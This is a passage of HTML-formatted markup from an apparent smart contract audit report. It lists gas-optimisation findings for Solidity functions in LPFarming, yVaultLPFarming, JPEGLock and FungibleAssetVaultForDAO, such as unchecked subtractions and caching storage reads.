class=\"mtk1\">, </span><span class=\"mtk12\">remainingRewards</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L127)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">remainingRewards</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:                 </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">remainingRewards</span><span class=\"mtk1\">  </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L129)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-03-lpfarmingwithdraw-l248-should-be-unchecked-due-to-l243\" style=\"position:relative;\"><a href=\"#g-03-lpfarmingwithdraw-l248-should-be-unchecked-due-to-l243\" aria-label=\"g 03 lpfarmingwithdraw l248 should be unchecked due to l243 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] <code>LPFarming.withdraw()</code>: L248 should be unchecked due to L243</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">236:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">237:         </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">238:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">PoolInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">UserInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;insufficient_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_updatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;  </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L243)</span></span></span></code></pre>\n<h2 id=\"g-04-lpfarming_withdrawreward-poolinfo_pidaccrewardpershare-should-get-cached\" style=\"position:relative;\"><a href=\"#g-04-lpfarming_withdrawreward-poolinfo_pidaccrewardpershare-should-get-cached\" aria-label=\"g 04 lpfarming_withdrawreward poolinfo_pidaccrewardpershare should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] <code>LPFarming._withdrawReward()</code>: <code>poolInfo[_pid].accRewardPerShare</code> should get cached</h2>\n<p>The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, the storage value should get cached in memory (see the <code>@audit</code> tags for further details):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">316</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">UserInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">317</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">318</span><span class=\"mtk1\">:             (</span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastAccRewardPerShare</span><span class=\"mtk1\">)) / </span><span class=\"mtk3\">//@audit gas: SLOAD 1 poolInfo[_pid].accRewardPerShare</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">319</span><span class=\"mtk1\">:             </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">320</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pending</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">321</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">userRewards</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastAccRewardPerShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_pid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 2 poolInfo[_pid].accRewardPerShare</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">325</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">326</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">327</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-05-yvaultlpfarmingwithdraw-l124-should-be-unchecked-due-to-l119\" style=\"position:relative;\"><a href=\"#g-05-yvaultlpfarmingwithdraw-l124-should-be-unchecked-due-to-l119\" aria-label=\"g 05 yvaultlpfarmingwithdraw l124 should be unchecked due to l119 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] <code>yVaultLPFarming.withdraw()</code>: L124 should be unchecked due to L119</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &gt;= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;insufficient_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_update</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;  </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L119)</span></span></span></code></pre>\n<h2 id=\"g-06-yvaultlpfarming_withdrawreward-accrewardpershare-should-get-cached\" style=\"position:relative;\"><a href=\"#g-06-yvaultlpfarming_withdrawreward-accrewardpershare-should-get-cached\" aria-label=\"g 06 yvaultlpfarming_withdrawreward accrewardpershare should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] <code>yVaultLPFarming._withdrawReward()</code>: <code>accRewardPerShare</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:             (</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">])) / </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 1 accRewardPerShare</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pending</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">userPendingRewards</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 2 accRewardPerShare</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-07-jpeglockunlock-use-storage-instead-of-copying-struct-in-memory-l69\" style=\"position:relative;\"><a href=\"#g-07-jpeglockunlock-use-storage-instead-of-copying-struct-in-memory-l69\" aria-label=\"g 07 jpeglockunlock use storage instead of copying struct in memory l69 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>JPEGLock.unlock()</code>: use <code>storage</code> instead of copying struct in memory L69</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">unlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">LockPosition</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">//@audit gas: costing 3 SLOADs while only lockAmount is needed twice. Replace &quot;memory&quot; with &quot;storage&quot; and cache only position.lockAmount </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;unauthorized&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">unlockAt</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;locked&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:         </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Unlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Here, a copy in memory is costing 3 SLOADs and 3 MSTORES. The, 2 variables are only read once through MLOAD (<code>position.owner</code> and <code>position.unlockAt</code>) and one is read twice (<code>position.lockAmount</code>).\nI suggest replacing the <code>memory</code> keyword with <code>storage</code> at L69 and only copying <code>position.lockAmount</code> in memory.</p>\n<h2 id=\"g-08-fungibleassetvaultfordao_collateralpriceusd-oracle-should-get-cached\" style=\"position:relative;\"><a href=\"#g-08-fungibleassetvaultfordao_collateralpriceusd-oracle-should-get-cached\" aria-label=\"g 08 fungibleassetvaultfordao_collateralpriceusd oracle should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] <code>FungibleAssetVaultForDAO._collateralPriceUsd()</code>: <code>oracle</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_collateralPriceUsd</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span 